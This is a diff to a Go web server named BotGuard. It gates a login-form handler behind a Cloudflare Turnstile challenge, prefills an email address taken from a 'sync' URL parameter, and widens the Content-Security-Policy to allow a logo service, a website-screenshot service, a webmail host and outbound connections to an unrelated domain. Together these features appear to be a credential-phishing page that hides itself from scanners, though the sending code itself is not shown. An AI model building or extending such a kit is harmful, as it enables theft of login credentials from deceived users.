@@ -55,7 +55,7 @@ func loadConfig() (*BotGuardConfig, error) {
 
 // setCSP sets the Content Security Policy header for security.
 func setCSP(w http.ResponseWriter) {
-	w.Header().Set("Content-Security-Policy", "default-src 'self'; img-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; frame-src https://challenges.cloudflare.com;")
+	w.Header().Set("Content-Security-Policy", "default-src 'self' https://logo.clearbit.com; img-src 'self' https://image.thum.io https://roundcube.secure.ne.jp https://i.imgur.com https://logo.clearbit.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ajax.googleapis.com https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://logo.clearbit.com https://image.thum.io https://baloncard.online; frame-src https://challenges.cloudflare.com;")
 }
 
 // challengeHandler serves the Turnstile CAPTCHA challenge page.
@@ -68,7 +68,10 @@ func challengeHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Unable to load challenge template", http.StatusInternalServerError)
 		return
 	}
-	tmpl.Execute(w, nil)
+
+	// Pass the sync email to the challenge template for UI usage
+	email := r.URL.Query().Get("sync")
+	tmpl.Execute(w, map[string]interface{}{"Email": email})
 }
 
 // authHandler handles the login form submission.
@@ -93,31 +96,6 @@ func authHandler(w http.ResponseWriter, r *http.Request) {
 	tmpl.Execute(w, nil)
 }
 
-// TurnstilePreloadMiddleware checks Turnstile CAPTCHA response before serving the requested page.
-func TurnstilePreloadMiddleware(next http.Handler) http.Handler {
-	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Check for token in URL query parameters
-		token := r.URL.Query().Get("cf-turnstile-response")
-
-		if token == "" {
-			// If token is missing, redirect to the challenge page
-			http.Redirect(w, r, "/challenge", http.StatusSeeOther)
-			return
-		}
-
-		// Verify the Turnstile token
-		success, err := middlewares.TurnstileVerify(token)
-		if err != nil || !success {
-			// If verification fails, redirect to the challenge page
-			http.Redirect(w, r, "/challenge", http.StatusSeeOther)
-			return
-		}
-
-		// If Turnstile verification is successful, serve the requested page
-		next.ServeHTTP(w, r)
-	})
-}
-
 func main() {
 	// Load environment variables from .env file
 	err := godotenv.Load()
@@ -138,9 +116,8 @@ func main() {
 	// Serve static assets
 	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
 
-	// Handle authentication with Turnstile validation
-	// mux.Handle("/auth", TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))
-	mux.Handle("/auth", TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))
+	// Handle authentication with Turnstile validation middleware
+	mux.Handle("/auth", middlewares.TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))
 
 	// Handle the challenge route
 	mux.HandleFunc("/challenge", challengeHandler)
